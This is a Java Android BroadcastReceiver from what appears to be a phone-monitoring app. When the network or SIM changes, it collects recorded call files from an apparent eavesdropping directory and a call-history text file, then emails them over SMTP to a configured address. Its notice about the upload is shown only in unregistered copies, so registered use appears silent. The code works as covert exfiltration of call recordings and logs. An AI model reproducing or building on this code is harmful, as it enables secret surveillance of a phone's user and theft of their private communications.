package com.shiliukeji.xc_lsy.androidkillerservice.reveiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

import com.elvishew.xlog.XLog;
import com.shiliukeji.xc_lsy.androidkillerservice.R;
import com.shiliukeji.xc_lsy.androidkillerservice.service.GetSharePrefe;
import com.shiliukeji.xc_lsy.androidkillerservice.service.OtherOperatorService;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

/**
 * Created by XC_LSY on 2017/7/6.
 */

public class ConnectionChangeReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        GetSharePrefe paras = new GetSharePrefe(context);
        XLog.d("更换网络或者切换sim卡！！");
        SharedPreferences zcps = context.getSharedPreferences("reg", 0);
        if (OtherOperatorService.check3Gwifi(context) && paras.isUserSetOk()) {
            String useremail = paras.getUserEmail();
            String password = paras.getUserPassword();
            String from = useremail;
            String to = useremail;
            String smtp = paras.getSmtp();
            String port = paras.getPort();
            List<String> paths = new ArrayList();
            String pathString = OtherOperatorService.setJtingPath(context);
            if (pathString != null) {
                paths = OtherOperatorService.getFilePathList(new File(pathString));
            } else {
                paths = null;
            }
            if (paths != null) {
                String subject = paras.getShoujiName() + "发来--电话邮件集合";
                String content = "因手机网络未开启，以下是非及时的电话记录！<br/>----------------------------------------<br/>" + OtherOperatorService.getTxtHistory(new File(pathString, "phone.txt"));
                if (paras.isAllnet()) {
                    OtherOperatorService.uploadAllEmail(paths, pathString, smtp, port, useremail, password, from, to, subject, content);
                    if (!OtherOperatorService.isReg(paras.getUserEmail(), paras.getShoujiImei(), zcps.getString("zhucema", ""))) {
                        OtherOperatorService.showNotisfy(context, R.drawable.mytp, "温馨提示:你的电话记录集合已为你备份至" + useremail + "邮箱", "温馨提示", "你的电话记录集合已为你备份至" + useremail + "邮箱");
                    }
                } else if (paras.isWifi() && OtherOperatorService.checkwifiwork(context)) {
                    OtherOperatorService.uploadAllEmail(paths, pathString, smtp, port, useremail, password, from, to, subject, content);
                    if (!OtherOperatorService.isReg(paras.getUserEmail(), paras.getShoujiImei(), zcps.getString("zhucema", ""))) {
                        OtherOperatorService.showNotisfy(context, R.drawable.mytp, "温馨提示:你的电话记录集合已为你备份至" + useremail + "邮箱", "温馨提示", "你的电话记录集合已为你备份至" + useremail + "邮箱");
                    }
                }
            }
        }
    }
}